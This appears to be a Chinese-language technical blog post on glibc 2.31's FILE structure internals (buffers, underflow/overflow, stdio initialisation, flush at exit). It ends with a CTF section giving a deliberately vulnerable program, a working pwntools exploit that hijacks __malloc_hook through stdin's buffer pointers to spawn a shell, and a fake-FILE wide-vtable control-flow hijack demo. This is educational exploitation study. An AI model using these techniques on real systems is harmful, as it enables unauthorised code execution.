# glibc FILE 结构体

glibc 2.31 是 ubuntu 20.04 所使用的 libc 版本，本文基于这个版本的代码进行分析，源码可以从 [glibc-2.31 tag](https://github.com/bminor/glibc/tree/glibc-2.31) 中找到。

## FILE 结构体定义

FILE 结构体定义在 `libio/bits/types/FILE.h` 中，是个对 `_IO_FILE` 的 typedef，而 `_IO_FILE` 定义在 `libio/bits/types/struct_FILE.h` 中：

```c
typedef struct _IO_FILE FILE;

struct _IO_FILE
{
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */

  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;	/* Current read pointer */
  char *_IO_read_end;	/* End of get area. */
  char *_IO_read_base;	/* Start of putback+get area. */
  char *_IO_write_base;	/* Start of put area. */
  char *_IO_write_ptr;	/* Current put pointer. */
  char *_IO_write_end;	/* End of put area. */
  char *_IO_buf_base;	/* Start of reserve area. */
  char *_IO_buf_end;	/* End of reserve area. */

  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */

  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  _IO_lock_t *_lock;
  __off64_t _offset;
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data;
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
  size_t __pad5;
  int _mode;
  /* Make sure we don't get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
};
```

实际上，FILE 通常还会带一个尾部的 vtable，保存了一些函数的指针，成为 `_IO_FILE_plus` 结构体：

```c
struct _IO_FILE_plus
{
  FILE file;
  const struct _IO_jump_t *vtable;
};
```

stdin/stdout/stderr 都是这个结构体的类型：

```c
// libio/libio.h
extern struct _IO_FILE_plus _IO_2_1_stdin_;
extern struct _IO_FILE_plus _IO_2_1_stdout_;
extern struct _IO_FILE_plus _IO_2_1_stderr_;

// libio/stdio.c
FILE *stdin = (FILE *) &_IO_2_1_stdin_;
FILE *stdout = (FILE *) &_IO_2_1_stdout_;
FILE *stderr = (FILE *) &_IO_2_1_stderr_;
```

用 `fopen` 分配出来的 `FILE` 结构体实际上是 `struct locked_FILE` 类型，返回的 `FILE *` 指向它的 `fp.file` 成员：

```c
struct locked_FILE
{
  struct _IO_FILE_plus fp;
  _IO_lock_t lock;
  struct _IO_wide_data wd;
};
```

## 缓冲区操作

FILE 结构体维护了一个缓冲区：`_IO_buf_base` 到 `_IO_buf_end`，里面保存了一些缓存的数据；为了从缓冲区读取数据，或者写入数据到缓冲区，额外维护了读和写的指针：

- 读：`_IO_read_ptr` 指向缓冲区中还没有读取的下一个字节，`_IO_read_end` 指向缓冲区中可以读取的范围的结尾
- 写：`_IO_write_ptr` 指向缓冲区中可以写入的下一个字节的位置，`_IO_write_end` 指向缓冲区中可以写入的范围的结尾

### getc

因此，读取数据的时候，如果 `_IO_read_ptr < _IO_read_end`，可以从 `_IO_read_ptr` 读取数据，并更新 `_IO_read_ptr` 指针即可，正如 `getc` 的实现：

```c
#define __getc_unlocked_body(_fp)					\
  (__glibc_unlikely ((_fp)->_IO_read_ptr >= (_fp)->_IO_read_end)	\
   ? __uflow (_fp) : *(unsigned char *) (_fp)->_IO_read_ptr++)
```

### uflow

但如果缓冲区中没有可以读的数据，即 `_IO_read_ptr >= _IO_read_end`，就需要把更多数据读取到 buffer 中，再获取下一个字节的内容。这是在 `__uflow` 函数中实现的，它会调用 FILE 结构体的 vtable 的 uflow hook，默认指向了 `_IO_default_uflow` 函数：

```c
int
_IO_default_uflow (FILE *fp)
{
  int ch = _IO_UNDERFLOW (fp);
  if (ch == EOF)
    return EOF;
  return *(unsigned char *) fp->_IO_read_ptr++;
}
```

它会继续调用 vtable 的 underflow hook，然后返回 `_IO_read_ptr` 指向的第一个字符，所以 uflow 就是 underflow 的特殊情况，用于 getc 的场景。

### underflow

接下来看 underflow hook 的实现，默认的 underflow hook 是 `_IO_new_file_underflow` 函数：

```c
int
_IO_new_file_underflow (FILE *fp)
{
  ssize_t count;

  /* C99 requires EOF to be "sticky".  */
  if (fp->_flags & _IO_EOF_SEEN)
    return EOF;

  if (fp->_flags & _IO_NO_READS)
    {
      fp->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
  if (fp->_IO_read_ptr < fp->_IO_read_end)
    return *(unsigned char *) fp->_IO_read_ptr;

  if (fp->_IO_buf_base == NULL)
    {
      /* Maybe we already have a push back pointer.  */
      if (fp->_IO_save_base != NULL)
        {
          free (fp->_IO_save_base);
          fp->_flags &= ~_IO_IN_BACKUP;
        }
      _IO_doallocbuf (fp);
    }

  /* FIXME This can/should be moved to genops ?? */
  if (fp->_flags & (_IO_LINE_BUF|_IO_UNBUFFERED))
    {
      /* We used to flush all line-buffered stream.  This really isn't
         required by any standard.  My recollection is that
         traditional Unix systems did this for stdout.  stderr better
         not be line buffered.  So we do just that here
         explicitly.  --drepper */
      _IO_acquire_lock (stdout);

      if ((stdout->_flags & (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))
          == (_IO_LINKED | _IO_LINE_BUF))
        _IO_OVERFLOW (stdout, EOF);

      _IO_release_lock (stdout);
    }

  _IO_switch_to_get_mode (fp);

  /* This is very tricky. We have to adjust those
     pointers before we call _IO_SYSREAD () since
     we may longjump () out while waiting for
     input. Those pointers may be screwed up. H.J. */
  fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;
  fp->_IO_read_end = fp->_IO_buf_base;
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end
    = fp->_IO_buf_base;

  count = _IO_SYSREAD (fp, fp->_IO_buf_base,
                       fp->_IO_buf_end - fp->_IO_buf_base);
  if (count <= 0)
    {
      if (count == 0)
        fp->_flags |= _IO_EOF_SEEN;
      else
        fp->_flags |= _IO_ERR_SEEN, count = 0;
  }
  fp->_IO_read_end += count;
  if (count == 0)
    {
      /* If a stream is read to EOF, the calling application may switch active
         handles.  As a result, our offset cache would no longer be valid, so
         unset it.  */
      fp->_offset = _IO_pos_BAD;
      return EOF;
    }
  if (fp->_offset != _IO_pos_BAD)
    _IO_pos_adjust (fp->_offset, count);
  return *(unsigned char *) fp->_IO_read_ptr;
}
```

可以看到，核心思路就是通过 `read` 系统调用读取更多数据，把数据保存到 `_IO_buf_base` 指向的空间，然后把读取的指针 `_IO_read_ptr` 指向 buffer 的开头 `_IO_buf_base`，`_IO_read_end` 指向 buffer 中已读取数据的结尾：`_IO_buf_base`。

### 缓冲区初始化

那么缓冲区是怎么初始化的呢？上面的 underflow hook 代码里，当 buffer 为 NULL 的时候，会通过 `_IO_doallocbuf` 函数来初始化缓冲区：

```c
void
_IO_doallocbuf (FILE *fp)
{
  if (fp->_IO_buf_base)
    return;
  if (!(fp->_flags & _IO_UNBUFFERED) || fp->_mode > 0)
    if (_IO_DOALLOCATE (fp) != EOF)
      return;
  _IO_setb (fp, fp->_shortbuf, fp->_shortbuf+1, 0);
}
```

如果这个 stream 是 unbuffered（例如 stderr），它就会把 buffer 指向 FILE 结构体自己的 `char _shortbuf[1]` 字段，里面只能保存一个字节的数据，保证了有空间保存 `ungetc` 的数据。

否则，它会调用 doallocate hook，默认指向 `_IO_file_doallocate` 函数：

```c
int
_IO_file_doallocate (FILE *fp)
{
  size_t size;
  char *p;
  struct stat64 st;

  size = BUFSIZ;
  if (fp->_fileno >= 0 && __builtin_expect (_IO_SYSSTAT (fp, &st), 0) >= 0)
    {
      if (S_ISCHR (st.st_mode))
        {
          /* Possibly a tty.  */
          if (
#ifdef DEV_TTY_P
              DEV_TTY_P (&st) ||
#endif
              local_isatty (fp->_fileno))
            fp->_flags |= _IO_LINE_BUF;
        }
#if defined _STATBUF_ST_BLKSIZE
      if (st.st_blksize > 0 && st.st_blksize < BUFSIZ)
        size = st.st_blksize;
#endif
    }
  p = malloc (size);
  if (__glibc_unlikely (p == NULL))
    return EOF;
  _IO_setb (fp, p, p + size, 1);
  return 1;
}
```

即通过 malloc 分配一个缓冲区。

### putc

刚才讲到了 getc 的实现，类似地，putc 的实现则是在 `_IO_write_ptr < _IO_write_end` 的时候，把数据写入到 `_IO_write_ptr` 并更新：

```c
#define __putc_unlocked_body(_ch, _fp)					\
  (__glibc_unlikely ((_fp)->_IO_write_ptr >= (_fp)->_IO_write_end)	\
   ? __overflow (_fp, (unsigned char) (_ch))				\
   : (unsigned char) (*(_fp)->_IO_write_ptr++ = (_ch)))
```

### overflow

同样地，如果缓冲区已满，就需要调用 overflow 函数来处理，默认的 overflow hook 实现是 `_IO_new_file_overflow` 函数：

```c
int
_IO_new_file_overflow (FILE *f, int ch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
    {
      /* Allocate a buffer if needed. */
      if (f->_IO_write_base == NULL)
        {
          _IO_doallocbuf (f);
          _IO_setg (f, f->_IO_buf_base, f->_IO_buf_base, f->_IO_buf_base);
        }
      /* Otherwise must be currently reading.
         If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,
         logically slide the buffer forwards one block (by setting the
         read pointers to all point at the beginning of the block).  This
         makes room for subsequent output.
         Otherwise, set the read pointers to _IO_read_end (leaving that
         alone, so it can continue to correspond to the external position). */
      if (__glibc_unlikely (_IO_in_backup (f)))
        {
          size_t nbackup = f->_IO_read_end - f->_IO_read_ptr;
          _IO_free_backup_area (f);
          f->_IO_read_base -= MIN (nbackup,
                                   f->_IO_read_base - f->_IO_buf_base);
          f->_IO_read_ptr = f->_IO_read_base;
        }

      if (f->_IO_read_ptr == f->_IO_buf_end)
        f->_IO_read_end = f->_IO_read_ptr = f->_IO_buf_base;
      f->_IO_write_ptr = f->_IO_read_ptr;
      f->_IO_write_base = f->_IO_write_ptr;
      f->_IO_write_end = f->_IO_buf_end;
      f->_IO_read_base = f->_IO_read_ptr = f->_IO_read_end;

      f->_flags |= _IO_CURRENTLY_PUTTING;
      if (f->_mode <= 0 && f->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
        f->_IO_write_end = f->_IO_write_ptr;
    }
  if (ch == EOF)
    return _IO_do_write (f, f->_IO_write_base,
                         f->_IO_write_ptr - f->_IO_write_base);
  if (f->_IO_write_ptr == f->_IO_buf_end ) /* Buffer is really full */
    if (_IO_do_flush (f) == EOF)
      return EOF;
  *f->_IO_write_ptr++ = ch;
  if ((f->_flags & _IO_UNBUFFERED)
      || ((f->_flags & _IO_LINE_BUF) && ch == '\n'))
    if (_IO_do_write (f, f->_IO_write_base,
                      f->_IO_write_ptr - f->_IO_write_base) == EOF)
      return EOF;
  return (unsigned char) ch;
}
```

它会尝试把目前缓冲区中的数据通过 `_IO_do_write` 写出去：

```c
static size_t
new_do_write (FILE *fp, const char *data, size_t to_do)
{
  size_t count;
  if (fp->_flags & _IO_IS_APPENDING)
    /* On a system without a proper O_APPEND implementation,
       you would need to sys_seek(0, SEEK_END) here, but is
       not needed nor desirable for Unix- or Posix-like systems.
       Instead, just indicate that offset (before and after) is
       unpredictable. */
    fp->_offset = _IO_pos_BAD;
  else if (fp->_IO_read_end != fp->_IO_write_base)
    {
      off64_t new_pos
        = _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
      if (new_pos == _IO_pos_BAD)
        return 0;
      fp->_offset = new_pos;
    }
  count = _IO_SYSWRITE (fp, data, to_do);
  if (fp->_cur_column && count)
    fp->_cur_column = _IO_adjust_column (fp->_cur_column - 1, data, count) + 1;
  _IO_setg (fp, fp->_IO_buf_base, fp->_IO_buf_base, fp->_IO_buf_base);
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_buf_base;
  fp->_IO_write_end = (fp->_mode <= 0
                       && (fp->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
                       ? fp->_IO_buf_base : fp->_IO_buf_end);
  return count;
}
```

它会把缓冲区中的数据通过 `write` 系统调用写出去，然后重置 write 指针，使得 buffer 可以被复用。

## stdin/stdout/stderr 初始化

stdin/stdout/stderr 是一个初始化好的 `_IO_FILE_plus` 类型的结构体，其定义如下：

```c
#  define FILEBUF_LITERAL(CHAIN, FLAGS, FD, WDP) \
       { _IO_MAGIC+_IO_LINKED+_IO_IS_FILEBUF+FLAGS, \
         0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, (FILE *) CHAIN, FD, \
         0, _IO_pos_BAD, 0, 0, { 0 }, &_IO_stdfile_##FD##_lock, _IO_pos_BAD,\
         NULL, WDP, 0 }
# define DEF_STDFILE(NAME, FD, CHAIN, FLAGS) \
  static _IO_lock_t _IO_stdfile_##FD##_lock = _IO_lock_initializer; \
  static struct _IO_wide_data _IO_wide_data_##FD \
    = { ._wide_vtable = &_IO_wfile_jumps }; \
  struct _IO_FILE_plus NAME \
    = {FILEBUF_LITERAL(CHAIN, FLAGS, FD, &_IO_wide_data_##FD), \
       &_IO_file_jumps};

DEF_STDFILE(_IO_2_1_stdin_, 0, 0, _IO_NO_WRITES);
DEF_STDFILE(_IO_2_1_stdout_, 1, &_IO_2_1_stdin_, _IO_NO_READS);
DEF_STDFILE(_IO_2_1_stderr_, 2, &_IO_2_1_stdout_, _IO_NO_READS+_IO_UNBUFFERED);

struct _IO_FILE_plus *_IO_list_all = &_IO_2_1_stderr_;
```

可以看到，它初始化了这些字段：

1. `_chain` 字段：所有的 `FILE *` 构成一个单向链表，链表头是 `_IO_list_all`，初始化为 `_IO_list_all -> _IO_2_1_stderr_ -> _IO_2_1_stdout_ -> _IO_2_1_stdin_`，这个链表后续用在 exit 的时候清空缓冲区
2. `_fileno` 字段：stdin 对应 FD 0，stdout 对应 FD 1，stderr 对应 FD 2
3. `_flags` 字段：设置为 `_IO_MAGIC | _IO_LINKED | _IO_IS_FILEBUF` 加额外的 flags，stdin 额外设置 `_IO_NO_WRITES` 表示不可写，stdout 和 stderr 额外设置 `_IO_NO_READS` 表示不可读，stderr 还额外设置了 `_IO_UNBUFFERED` 表示不做缓冲
4. 其余部分就是初始化 `lock`、`vtable` 和 `wide_data`，然后把 offset 设置为 `_IO_pos_BAD`

写一段程序通过遍历 `_IO_list_all` 来打印出所有的 `FILE *` 结构体：

```c
#include <stdint.h>
#include <stdio.h>

struct _IO_FILE_plus {
  FILE file;
  void *vtable;
};

int main() {
  // offset obtained by objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep
  // _IO_2_1_stdin_
  uint8_t *libc_base = (uint8_t *)stdin - 0x1ec980;

  // offset obtained by objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep
  // _IO_list_all
  struct _IO_FILE_plus **list_all =
      (struct _IO_FILE_plus **)(libc_base + 0x1ed5a0);

  printf("stdin is %p\n", stdin);
  printf("stdout is %p\n", stdout);
  printf("stderr is %p\n", stderr);
  FILE *fp = fopen("log", "w");
  fprintf(fp, "Hello, world!");
  printf("fp is %p\n", fp);

  FILE *file = &(*list_all)->file;
  while (file) {
    printf("Found FILE * at %p, fd is %d\n", file, file->_fileno);
    file = file->_chain;
  }
  return 0;
}
```

输出符合预期：

```c
stdin is 0x7f64e53f7980
stdout is 0x7f64e53f86a0
stderr is 0x7f64e53f85c0
fp is 0x5650ba3846b0
Found FILE * at 0x5650ba3846b0, fd is 3
Found FILE * at 0x7f64e53f85c0, fd is 2
Found FILE * at 0x7f64e53f86a0, fd is 1
Found FILE * at 0x7f64e53f7980, fd is 0
```

## 程序退出时 flush 缓冲区

编程的时候，如果看不到 printf 打印的内容，可能是因为它的数据写入了缓冲区，但是因为程序没有正常退出，所以没有 flush 出来。那也就是说，如果程序正常退出，glibc 会自动进行 flush 操作。其机制是，libc 在结束进程前，会调用 `_IO_cleanup` 函数把缓冲区内的数据 flush 出去：

```c
text_set_element(__libc_atexit, _IO_cleanup);

int
_IO_cleanup (void)
{
  int result = _IO_flush_all_lockp (0);

  /* omitted */

  return result;
}
```

它调用的 `_IO_flush_all_lockp` 函数会遍历 `_IO_list_all` 链表，检查它是否需要 flush：

```c
int
_IO_flush_all_lockp (int do_lock)
{
  int result = 0;
  FILE *fp;

  /* omitted */

  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp->_chain)
    {
      run_fp = fp;
      if (do_lock)
        _IO_flockfile (fp);

      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
           || (_IO_vtable_offset (fp) == 0
               && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
                                    > fp->_wide_data->_IO_write_base))
           )
          && _IO_OVERFLOW (fp, EOF) == EOF)
        result = EOF;

      if (do_lock)
        _IO_funlockfile (fp);
      run_fp = NULL;
    }

  /* omitted */

  return result;
}
```

这里的 `_IO_OVERFLOW` 函数会把缓冲区内的数据通过 write syscall 输出。

## CTF

### 修改 `stdin->_IO_buf_base` 以实现任意地址写

下面演示如何利用一个任意地址的两字节写，在一个可以操控的 getchar/scanf 调用且外加可控 size 的 malloc 的程序中实现 get shell：

被攻击的程序：

```c
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  // offset obtained by objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep
  // _IO_2_1_stdin_
  uint8_t *libc_base = (uint8_t *)stdin - 0x1ec980;

  // unbuffered i/o: _IO_buf_base points to _shortbuf
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  // leak address to ease attack
  printf("libc base is at %p\n", libc_base);

  int num_actions = 0;
  printf("input number of actions:\n");
  scanf("%d", &num_actions);
  printf("input actions (1 for echo, 2 for random write):\n");
  int *actions = (int *)malloc(sizeof(int) * num_actions);
  for (int i = 0; i < num_actions; i++) {
    scanf("%d", &actions[i]);
  }
  size_t malloc_size;
  printf("input malloc size:\n");
  scanf("%zu", &malloc_size);

  for (int i = 0; i < num_actions; i++) {
    int action = actions[i];
    printf("action is %d\n", action);
    printf("read remain size is %ld\n",
           stdin->_IO_read_end - stdin->_IO_read_ptr);
    printf("buffer from %p to %p\n", stdin->_IO_buf_base, stdin->_IO_buf_end);
    if (action == 1) {
      // echo
      int ch = getchar();
      printf("echo: %d\n", ch);
    } else if (action == 2) {
      uint16_t *addr;
      unsigned int data;
      printf("input address and data:\n");
      if (scanf("%p%d", &addr, &data) != 2) {
        printf("invalid input\n");
        continue;
      }

      data = (uint16_t)data;

      printf("write #%d: write 0x%x to %p\n", i, data, addr);
      *addr = data;
    }
  }

  // trigger system("/bin/sh")
  void *p = malloc(malloc_size);
  return 0;
}
```

它首先读取一系列的操作和最后 malloc 的 size，然后按照操作调用 getchar 或者 scanf，其中 scanf 得到的地址可以对任意地址进行两字节的写。对应的利用过程如下：

1. 为了简单，程序直接把 libc 的 base 打印了出来，假设攻击者已经获取到了 libc 的基地址
2. 根据任意地址两字节写，把 stdin 的 _IO_buf_base 指向它自己也就是 `&_IO_buf_base`（初始情况下，它指向 `_IO_2_1_stdin` 的 `_shortbuf` 字段，和 `&_IO_buf_base` 只有最低两字节不同）
3. 利用 `scanf` 触发 `read(fd, _IO_buf_base, _IO_buf_end - _IO_buf_size)` 系统调用，往 `&_IO_buf_base` 写入 16 字节数据，覆盖掉 `_IO_buf_base` 和 `_IO_buf_end` 的取值：设置 `_IO_buf_base` 为 `__malloc_hook`，设置 `_IO_buf_end` 为 `__malloc_hook + 8`，保证 `_IO_buf_base < _IO_buf_end`
4. 上一次调用过后，`_IO_read_ptr` 等于 `&_IO_buf_base`，`_IO_read_end` 等于 `_IO_read_ptr + 16`；调用 16 次 getchar，使得 `_IO_read_ptr == _IO_read_end`
5. 利用 `scanf` 再次触发 `read(fd, _IO_buf_base, _IO_buf_end - _IO_buf_size)` 系统调用 ，往 `_IO_buf_base` 也就是 `__malloc_hook` 写入 8 字节数据：设置 `__malloc_hook` 为 `system`
6. 最后利用已有的 `malloc(size)` 调用，把 `size` 设置为 `/bin/sh` 字符串的地址，由于 `__malloc_hook` 此时已经指向了 `system`，所以 `malloc("/bin/sh")` 会调用 `system("/bin/sh")` 实现 get shell

利用代码如下：

```py
from pwn import *

context(os="linux", arch="amd64", log_level="debug", terminal=["tmux", "splitw", "-h"])
p = process("./random_write")

# read libc base address from the program
line = p.recvline().decode("utf-8")
libc_base = int(line.split(" ")[-1], 16)

# prepare actions:
# step 1(["2"]): override _IO_buf_base to point to itself
# step 2(["2"]): override _IO_buf_base to point to __malloc_hook and _IO_buf_end to __malloc_hook+8
# step 3(["1"]*16): increment _IO_read_ptr until it equals to _IO_read_end
# step 4(["2"]): trigger sys_read to write one_gadget to __malloc_hook variable
p.recvuntil(b"input number of action")
actions = ["2"] + ["2"] + ["1"] * 16 + ["2"]
p.sendline(f"{len(actions)}".encode("utf-8"))
p.recvuntil(b"input actions")
p.sendline(" ".join(actions).encode("utf-8"))

# send address of "/bin/sh" as malloc size
# obtained by decompiling system()
p.recvuntil(b"input malloc size")
bin_sh = libc_base + 0x1B45BD
p.sendline(f"{bin_sh}".encode("utf-8"))

# initially _IO_buf_base points to stdin._shortbuf,
# which is stdin + 0x83, i.e. libc_base + 0x1ECA03.
# override the lowest two bytes of stdin._IO_buf_base to 0xC9B8
# then _IO_buf_base points to libc_base + 0x1EC9B8, which is _IO_buf_base itself
# obtained via objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep __IO_2_1_stdin
stdin = libc_base + 0x1EC980
stdin_io_buf_base = stdin + 0x38  # offsetof(struct _IO_FILE, _IO_buf_base)
p.recvuntil(b"input address and data")
p.sendline(f"0x{stdin_io_buf_base:x} {stdin_io_buf_base & 0xFFFF}".encode("utf-8"))

# now _IO_buf_base points to itself,
# write __malloc_hook to _IO_buf_base and
# __malloc_hook+8 to _IO_buf_end.
# this is required _IO_buf_base must be smaller than _IO_buf_end.
# obtained via objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep malloc_hook
malloc_hook = libc_base + 0x1ECB70
p.recvuntil(b"input address and data")
p.send(p64(malloc_hook) + p64(malloc_hook + 8))

# now _IO_read_ptr points to libc_base + 0x1EC9B8,
# _IO_read_end points to libc_base + 0x1EC9C8,
# we want them to become equal to read more data into _IO_buf_base,
# the _IO_read_ptr pointer is incremented 16 times via getchar().

# override __malloc_hook to system
# obtained via objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep system
system = libc_base + 0x52290
p.recvuntil(b"input address and data")
p.sendline(p64(system))

# waiting for shell
p.sendline(b"whoami && id")
p.interactive()
```

### 控制流劫持

前面提到，libc 在结束进程前，会遍历 `_IO_list_all` 链表，每个 FILE 的缓冲区是否还有内容：如果检查 `fp->_IO_write_ptr > fp->_IO_write_base` 或者 `_IO_vtable_offset (fp) == 0 && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)` 成立，就说明还有数据没有通过 write syscall 写出去，这时候就会调用 overflow hook 函数来做这件事情。overflow hook 本身保存在 vtable 中，而 vtable 受到了保护，在 `IO_validate_vtable` 函数中检查它是否合法，即是否为 glibc 自带的 vtable，此时如果用自己构造的 vtable，就会出现 `Fatal error: glibc detected an invalid stdio handle` 错误。

既然不能用 glibc 以外的 vtable，这时候可以利用 glibc 自带的另一个 vtable：`IO_wfile_jumps`，它的 `overflow` 函数指向了 `_IO_wfile_overflow`，而这个函数在一些条件下会调用 `_IO_wdoallocbuf` 进而调用 `_IO_WDOALLOCATE`，此时它会从 `_wide_data` 字段读取 vtable，这个 vtable 是没有检查的，所以可以攻击。演示代码如下：

```c
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

#define JUMP_FIELD(TYPE, NAME) void *NAME

struct _IO_jump_t {
  JUMP_FIELD(size_t, __dummy);
  JUMP_FIELD(size_t, __dummy2);
  JUMP_FIELD(_IO_finish_t, __finish);
  JUMP_FIELD(_IO_overflow_t, __overflow);
  JUMP_FIELD(_IO_underflow_t, __underflow);
  JUMP_FIELD(_IO_underflow_t, __uflow);
  JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
  /* showmany */
  JUMP_FIELD(_IO_xsputn_t, __xsputn);
  JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
  JUMP_FIELD(_IO_seekoff_t, __seekoff);
  JUMP_FIELD(_IO_seekpos_t, __seekpos);
  JUMP_FIELD(_IO_setbuf_t, __setbuf);
  JUMP_FIELD(_IO_sync_t, __sync);
  JUMP_FIELD(_IO_doallocate_t, __doallocate);
  JUMP_FIELD(_IO_read_t, __read);
  JUMP_FIELD(_IO_write_t, __write);
  JUMP_FIELD(_IO_seek_t, __seek);
  JUMP_FIELD(_IO_close_t, __close);
  JUMP_FIELD(_IO_stat_t, __stat);
  JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
  JUMP_FIELD(_IO_imbue_t, __imbue);
};

struct _IO_FILE_plus {
  FILE file;
  struct _IO_jump_t *vtable;
};

struct __gconv_step_data {
  unsigned char *__outbuf;
  unsigned char *__outbufend;
  int __flags;
  int __invocation_counter;
  int __internal_use;
  __mbstate_t *__statep;
  __mbstate_t __state;
};

typedef struct {
  struct __gconv_step *step;
  struct __gconv_step_data step_data;
} _IO_iconv_t;

struct _IO_codecvt {
  _IO_iconv_t __cd_in;
  _IO_iconv_t __cd_out;
};

struct _IO_wide_data {
  wchar_t *_IO_read_ptr;   /* Current read pointer */
  wchar_t *_IO_read_end;   /* End of get area. */
  wchar_t *_IO_read_base;  /* Start of putback+get area. */
  wchar_t *_IO_write_base; /* Start of put area. */
  wchar_t *_IO_write_ptr;  /* Current put pointer. */
  wchar_t *_IO_write_end;  /* End of put area. */
  wchar_t *_IO_buf_base;   /* Start of reserve area. */
  wchar_t *_IO_buf_end;    /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  wchar_t *_IO_save_base;   /* Pointer to start of non-current get area. */
  wchar_t *_IO_backup_base; /* Pointer to first valid character of
                               backup area */
  wchar_t *_IO_save_end;    /* Pointer to end of non-current get area. */

  __mbstate_t _IO_state;
  __mbstate_t _IO_last_state;
  struct _IO_codecvt _codecvt;

  wchar_t _shortbuf[1];

  const struct _IO_jump_t *_wide_vtable;
};

void get_shell() { system("/bin/sh"); }

int main() {
  // offset obtained by objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep
  // _IO_2_1_stdin_
  uint8_t *libc_base = (uint8_t *)stdin - 0x1ec980;

  // offset obtained by objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep
  // _IO_list_all
  struct _IO_FILE_plus **list_all =
      (struct _IO_FILE_plus **)(libc_base + 0x1ed5a0);

  // create a fake FILE struct
  struct _IO_FILE_plus *fake_file =
      (struct _IO_FILE_plus *)malloc(sizeof(struct _IO_FILE_plus));

  // we must satisfy the following conditions:
  // 1. required in _IO_flush_all_lockp: (_mode <= 0 && _IO_write_ptr >
  // _IO_write_base) || (_vtable_offset == 0 && _mode > 0 &&
  // _wide_data->_IO_write_ptr > _wide_data->_IO_write_base)
  // 2. required in _IO_wfile_overflow: (_flags & _IO_NO_WRITES) == 0 && (_flags
  // & _IO_CURRENTLY_PUTTING) == 0 && _wide_data->_IO_write_base == 0
  // 3. required in _IO_wdoallocbuf: _wide_data->_IO_buf_base == 0 && (flags &
  // _IO_UNBUFFERED) == 0
  fake_file->file._mode = 0;
  fake_file->file._IO_write_ptr = (char *)1;
  fake_file->file._IO_write_base = (char *)0;
  fake_file->file._flags = 0;
  fake_file->file._wide_data =
      (struct _IO_wide_data *)malloc(sizeof(struct _IO_wide_data));
  fake_file->file._wide_data->_IO_write_base = 0;
  fake_file->file._wide_data->_IO_buf_base = 0;

  // doallocate is called within _IO_wdoallocbuf
  struct _IO_jump_t *wide_vtable = malloc(sizeof(struct _IO_jump_t));
  wide_vtable->__doallocate = get_shell;
  fake_file->file._wide_data->_wide_vtable = wide_vtable;

  // use IO_wfile_jumps as vtable to pass vtable validation
  fake_file->vtable = (struct _IO_jump_t *)(libc_base + 0x1e8f60);

  *list_all = fake_file;

  return 0;
}
```

## 参考

- [第七届“湖湘杯” House _OF _Emma | 设计思路与解析](https://www.anquanke.com/post/id/260614)
- [Unexpected heap primitive and unintended solve - codegate quals 2025 writeup](https://rosayxy.github.io/codegate-quals-2025-writeup/)
- [[原创] House of apple 一种新的glibc中IO攻击方法 (2)](https://bbs.kanxue.com/thread-273832.htm)
- [Advanced Heap Exploitation: File Stream Oriented Programming](https://dangokyo.me/2018/01/01/advanced-heap-exploitation-file-stream-oriented-programming/)
- [STACK the Flags CTF 2022](https://chovid99.github.io/posts/stack-the-flags-ctf-2022/)
